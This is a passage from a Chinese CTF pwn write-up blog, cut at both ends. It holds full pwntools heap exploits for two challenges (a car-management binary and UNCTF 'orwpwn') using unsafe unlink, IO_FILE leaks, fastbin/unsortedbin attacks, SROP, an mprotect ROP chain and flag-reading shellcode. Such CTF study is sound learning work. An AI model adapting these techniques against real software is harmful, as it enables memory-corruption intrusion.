attack，发觉他给了这么多功能好像没用上，应该不是这个攻击方法。。。然后就去看wp了，发觉他的wp攻击流程那些点全用上了，不过复杂起来了，赛后还看到另外师傅的wp，就是说这个有非预期，就是用chunk extends加fastbin attack</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.ReKO1V3cZk/pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice&gt;&gt; \n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    c(idx)</span><br><span class="line">    sa(<span class="string">"Please input car's name: \n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Please input car's index: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input name: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input car's index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">down</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up1</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">"Car's Speed is "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ru(<span class="string">"Km/h"</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up2</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    ru(<span class="string">"Car's Speed is "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ru(<span class="string">"Km/h"</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlicense</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">6</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">8</span>)</span><br><span class="line">    ru(<span class="string">"gift: "</span>)</span><br><span class="line">    heap_base = int(r(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    heap_base = (heap_base &gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">12</span></span><br><span class="line">    new(<span class="number">3</span>, <span class="string">"3"</span>*<span class="number">0x4</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>) <span class="comment">#1</span></span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0xf0</span>,</span><br><span class="line">        heap_base+<span class="number">0x58</span><span class="number">-0x18</span>,</span><br><span class="line">        heap_base+<span class="number">0x58</span><span class="number">-0x10</span>,</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">3</span>,</span><br><span class="line">        <span class="number">0x1234</span></span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>)</span><br><span class="line">    payload += p64(<span class="number">0xf0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">        down(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up1(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up2(<span class="number">0</span>)</span><br><span class="line">    up1(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">7</span>,</span><br><span class="line">        <span class="number">0x1234</span>,</span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x220</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    new(<span class="number">3</span>, payload)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x68</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        heap_base+<span class="number">0x2b0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x101</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x221</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload) <span class="comment">#0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">        down(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up1(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up2(<span class="number">1</span>)</span><br><span class="line">    up1(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        heap_base + <span class="number">0x270</span>,</span><br><span class="line">        <span class="number">0x220</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">"Car 1's name: "</span>)</span><br><span class="line">    main_arena = uu64(r(<span class="number">6</span>))<span class="number">-88</span></span><br><span class="line">    libc.address = main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    __free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        heap_base + <span class="number">0x2e0</span>,</span><br><span class="line">        <span class="number">0x220</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    new(<span class="number">3</span>, <span class="string">"aaa\n"</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">2</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        heap_base + <span class="number">0x2e0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        <span class="number">0x231</span>,</span><br><span class="line">        main_arena+<span class="number">88</span>,</span><br><span class="line">        heap_base</span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    new(<span class="number">3</span>, p64(<span class="number">0</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span>,</span><br><span class="line">        p64(<span class="number">0x220</span>),</span><br><span class="line">        p64(__free_hook),</span><br><span class="line">        p32(<span class="number">0</span>),</span><br><span class="line">        <span class="string">'\n'</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    getlicense(<span class="number">1</span>, p64(system))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    lg(<span class="string">"main_arena"</span>, main_arena)</span><br><span class="line">    lg(<span class="string">"heap_base"</span>, heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="unctf-orwpwn"><a href="#unctf-orwpwn" class="headerlink" title="unctf ## orwpwn"></a>unctf ## orwpwn</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+]      libc.addressess--&gt;0x7f4fabd43000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;123456&#125;</span><br></pre></td></tr></table></figure><p>先放上成功结果</p><h3 id="新点"><a href="#新点" class="headerlink" title="新点"></a>新点</h3><h4 id="mprotect改内存页权限"><a href="#mprotect改内存页权限" class="headerlink" title="mprotect改内存页权限"></a>mprotect改内存页权限</h4><p>以前不知道这个姿势，知道后感觉挺骚的，挺强的一个方法<br>mprotect传入参数后，能让指定内存页变成可执行，所以利用方式</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbGFuZF9TdW4vYXJ0aWNsZS9kZXRhaWxzLzMzNzI4OTU1" title="https://blog.csdn.net/Roland_Sun/article/details/33728955">mprotect改内存页权限<i class="fa fa-external-link"></i></span></p><ol><li>知道一个内存页的地址</li><li>这个内存页内容可控</li></ol><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnJjaGFwbWFuLm9yZy9wb3N0cy9MaW51eF9TeXN0ZW1fQ2FsbF9UYWJsZV9mb3JfeDg2XzY0Lw==" title="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">x64系统调用表<i class="fa fa-external-link"></i></span></p><h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>这个我以前也很怕的，这次自己写了下好像也就那样嘛，不会很复杂的，通常来说，你只要自己调试下就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(shellcode)</span><br><span class="line">    print(asm(shellcode, arch=<span class="string">'amd64'</span>))</span><br></pre></td></tr></table></figure><p>可以通过context设置平台，context.arch=’amd64’<br>我这里没设置，所以就用每次加个amd64</p><p>打开flag文件部分，大概就是</p><ol><li>设置rax=2</li><li>rdi = filename</li><li>rsi = 0 #标志只读方式</li><li>rdx = 0 # mode其实可以不填，所以，不用设置也可以</li><li>rax=2 # 系统中断号</li><li>调用syscall</li></ol><p>后面几个流程差不多，看下中断表就行</p><p>自己写的话</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>然后我为了省事，直接用shellcraft.amd64.open(‘flag’)生成了</p><p>接下来读取函数，因为返回了fd，存在rax里，所以第一步要保存rax值到rdi里</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>在接下来写函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><img src="https://github.com/NoOne-hub/picture/blob/master/orw-2.png" alt="系统调用表"></p><p>最后推荐篇文章<br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY0NQ==" title="https://xz.aliyun.com/t/6645">shellcode编写<i class="fa fa-external-link"></i></span></p><p>感觉总结得挺好的</p><h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p>这部分可以去看下ctf-wiki吧</p><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5naXRodWIuaW8vY3RmLXdpa2kvcHduL2xpbnV4L3N0YWNrb3ZlcmZsb3cvYWR2YW5jZWQtcm9wLXpoLyNzcm9w" title="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop">SROP攻击<i class="fa fa-external-link"></i></span></p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><h4 id="准备部分"><a href="#准备部分" class="headerlink" title="准备部分"></a>准备部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) == (size+<span class="number">1</span>):</span><br><span class="line">        sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please input idx: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="IO-file攻击"><a href="#IO-file攻击" class="headerlink" title="IO_file攻击"></a>IO_file攻击</h4><p>这部分就是通过溢出，修改size,然后free掉一个fake的，最后通过IO_file攻击泄露地址，<br>这部分我是拿的ex师傅的部分的，我自己也写了个这部分的，利用chunk extends，搞复杂了，那会，感觉这个简洁些</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x68</span>, <span class="string">'1'</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x78</span>, <span class="string">'2'</span>) <span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x68</span>, payload*<span class="number">6</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x78</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xa1</span>)) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x98</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0x8620</span><span class="number">-0x40</span><span class="number">-0x3</span>))</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> ) <span class="comment">#3</span></span><br><span class="line">r(<span class="number">0x88</span>)</span><br><span class="line">libc.address = uu64(r(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">lg(<span class="string">"libc.addressess"</span>, libc.address)</span><br></pre></td></tr></table></figure><h4 id="unsortedbin攻击"><a href="#unsortedbin攻击" class="headerlink" title="unsortedbin攻击"></a>unsortedbin攻击</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">new(<span class="number">0x88</span>, <span class="string">'2'</span>) <span class="comment">#2</span></span><br></pre></td></tr></table></figure><h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><p>这里有个点点一下，就是srop部分，因为setcontext最后一句xor eax,eax，再加上syscall就是相当于调用read,<br>rdi 第一个参数 fd<br>rsi 第二个参数 buf<br>rdx 第三个参数 count 大小<br>rsp 执行完后的rsp<br>rip 就是 执行syscall加ret</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x13</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span> <span class="comment"># fd为0</span></span><br><span class="line">frame.rsi = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (libc.symbols[<span class="string">'__free_hook'</span>]) &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rip = libc.address + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line">new(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x60</span>])</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">'\x00'</span>*<span class="number">3</span> + p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br></pre></td></tr></table></figure><h4 id="mprotect修改内存页权限"><a href="#mprotect修改内存页权限" class="headerlink" title="mprotect修改内存页权限"></a>mprotect修改内存页权限</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"> layout = [</span><br><span class="line">     libc.address + <span class="number">0x0000000000021102</span>, <span class="comment">#: pop rdi; ret; </span></span><br><span class="line">     libc.symbols[<span class="string">'__free_hook'</span>] &amp; <span class="number">0xfffffffffffff000</span>, <span class="comment"># 开始地址</span></span><br><span class="line">     libc.address + <span class="number">0x00000000000202e8</span>, <span class="comment">#: pop rsi; ret; </span></span><br><span class="line">     <span class="number">0x2000</span>, <span class="comment"># 空间大小</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000001b92</span>, <span class="comment">#: pop rdx; ret;  </span></span><br><span class="line">     <span class="number">7</span>, <span class="comment"># rwx可读可写可执行</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000033544</span>, <span class="comment">#: pop rax; ret; </span></span><br><span class="line">     <span class="number">10</span>, <span class="comment">#mprotect调用号</span></span><br><span class="line">     libc.address + <span class="number">0x00000000000bc375</span>, <span class="comment">#: syscall; ret;</span></span><br><span class="line">     libc.address + <span class="number">0x0000000000002a71</span>, <span class="comment">#: jmp rsp; </span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><h4 id="shellcode-jmp-rsp"><a href="#shellcode-jmp-rsp" class="headerlink" title="shellcode jmp rsp"></a>shellcode jmp rsp</h4><p>第一份shellcode ex师傅的<br>第二份用pwntools加自己编写一些<br>第三份纯自己写一遍</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">    '''</span>)</span><br></pre></td></tr></table></figure><h4 id="getshell走起"><a href="#getshell走起" class="headerlink" title="getshell走起"></a>getshell走起</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s(flat(layout) + shellcode)</span><br></pre></td></tr></table></figure><p>。。。好像不能啊,只能特么的读flag，没意思</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'192.168.150.135'</span> </span><br><span class="line">port = <span 